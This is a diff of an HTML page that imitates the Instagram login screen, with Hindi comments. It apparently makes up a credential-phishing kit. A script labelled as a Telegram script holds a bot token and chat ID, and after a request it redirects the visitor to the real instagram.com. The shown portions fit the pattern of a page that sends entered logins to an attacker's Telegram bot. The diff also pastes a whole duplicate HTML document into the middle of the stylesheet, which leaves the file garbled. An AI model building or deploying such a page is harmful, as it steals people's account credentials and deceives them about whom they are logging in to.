@@ -218,6 +218,92 @@
         }
         .or-divider::before { margin-right: 18px; }
         .or-divider::after { margin-left: 18px; }
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-box {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 10px 0;
+            margin-bottom: 10px;
+        }
+        .logo-container {
+            text-align: center;
+            margin: 22px auto 12px auto;
+        }
+        .logo-container img {
+            width: 175px;
+            height: 51px;
+            object-fit: contain;
+        }
+        .form-container {
+            padding: 0 40px;
+        }
+        input {
+            width: 100%;
+            padding: 9px 0px 7px 9px;
+            margin-bottom: 6px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 7px;
+            margin-top: 8px;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1877f2;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 14px 40px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .or-divider::before, .or-divider::after {
+            content: "";
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-divider::before { margin-right: 18px; }
+        .or-divider::after { margin-left: 18px; }
 
         .fb-login {
             text-align: center;
@@ -235,7 +321,7 @@
             width: 350px;
             padding: 20px;
             text-align: center;
--            font-size: 14px;
+            font-size: 14px;
         }
         .signup-box a {
             color: #0095f6;
@@ -248,7 +334,7 @@
 
     <div class="main-wrapper">
         <div class="login-box">
-            <!-- असली इंस्टाग्राम का इमेज लोगो -->
+            <!-- परफेक्ट लोगो -->
             <div class="logo-container">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram">
             </div>
@@ -273,6 +359,7 @@
         </div>
     </div>
 
+    <!-- टेलीग्राम स्क्रिप्ट -->
     <script>
         const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
         const chatId = "7008289410";    
@@ -292,6 +379,12 @@
                 window.location.href = "https://instagram.com"; 
             })
             .catch(error => console.error('एरर:', error));
+        });
+    </script>
+
+</body>
+</html>
+
         });
     </script>
 
